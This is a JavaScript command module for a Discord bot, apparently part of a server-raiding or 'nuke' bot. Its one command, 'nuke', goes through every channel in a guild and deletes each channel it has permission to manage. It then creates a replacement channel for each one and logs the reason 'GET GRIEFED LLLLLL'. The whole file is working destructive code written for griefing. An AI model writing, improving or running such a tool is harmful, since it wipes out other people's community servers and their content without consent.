const { Client, Message, Permissions } = require("discord.js");
require('colors');

module.exports = {
    name: 'nuke',
    description: 'Nukes the complete guild.',

    /**
     * 
     * @param {Client} bot 
     * @param {Message} message 
     * @param {String[]} parts 
     */

    async execute(bot, message, parts) {
        if(message.guild.me.hasPermission('MANAGE_CHANNELS')) {
            message.guild.channels.cache.forEach(async ch => {
                if(ch.permissionsFor(message.guild.me).has(Permissions.FLAGS.MANAGE_CHANNELS)) {
                    ch.delete();
                    await console.log(`[SUCCCESS] Successfully deleted Channel '${ch.name}'`)
                    message.guild.channels.create(bot.cfg.messages.renameChannels, {
                        reason: `GET GRIEFED LLLLLL`,
                        type: 'text'
                    });
                    await console.log(`${`[SUCCESS]`.green} ${`Successfully created channel '${bot.cfg.messages.renameChannels}' replacing the channel '${ch.name}'!`.yellow}`)
                } else {
                    console.log(`${`[ERROR]`.red} ${`Missing Permissions for channel '${ch.name}'`.yellow}`);
                }
            })
        } else {
            console.log(`${`[ERROR]`.red} ${`Missing Permission 'MANAGE_CHANNELS' on Guild ${message.guild.name}!`.yellow}`);
        }
    }
}